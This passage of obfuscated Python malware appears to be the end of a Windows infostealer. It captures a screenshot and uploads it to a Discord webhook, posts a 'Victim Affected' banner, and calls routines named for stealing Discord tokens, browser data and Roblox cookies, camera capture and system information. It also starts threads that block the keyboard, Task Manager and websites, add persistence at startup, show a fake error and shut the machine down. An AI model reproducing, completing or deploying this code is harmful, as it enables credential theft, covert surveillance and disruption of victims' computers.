            v4r_image.save(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR)
        
        try:
            LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_screen}"
            capture(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_screen)
        except:
            LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_screen = VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_screen
            capture(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_screen)

        NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV = Embed(title=f"Screenshot `{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ} \"{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}\"`:", color=UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ)
        NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV.set_image(url=f"attachment://{VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_screen}")
        NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV.set_footer(text=CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU, icon_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD )
        CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE = SyncWebhook.from_url(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF)
        CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE.send(
                embed=NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV,
                file=File(f'{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_screen}', filename=VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR_file_screen),
                username=NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF,
                avatar_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD
            )

        if os.path.exists(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_screen):
            os.remove(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR_file_screen)
    except Exception as e:
        CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE = SyncWebhook.from_url(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF)
        NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV = Embed(
            title=f'Screenshot `{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ} "{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}"`:', 
            description=f"Impossible to take screenshot.\n**Error:** `{e}`",
            color=UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ)
        NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV.set_footer(text=CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU, icon_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)
        CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE.send(embed=NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV, username=NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF, avatar_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)

try: requests.post(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF, 'avatar_url': GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD,})
except: pass
try: threading.Thread(target=B10ck_K3y).start()
except: pass
try: threading.Thread(target=B10ck_T45k_M4n4g3r).start()
except: pass
try: threading.Thread(target=B10ck_W3b5it3).start()
except: pass
try: threading.Thread(target=St4rtup).start()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Di5c0rd_inj3c710n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
try: requests.post(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF, json={'content': f'****╚══════════════════{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}══════════════════╝****', 'username': NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF, 'avatar_url': GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD})
except: pass
try: threading.Thread(target=Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=R3st4rt).start()
except: pass
try: threading.Thread(target=F4k3_3rr0r).start()
except: pass
try: threading.Thread(target=Shutd0wn).start()
except: pass
Clear()
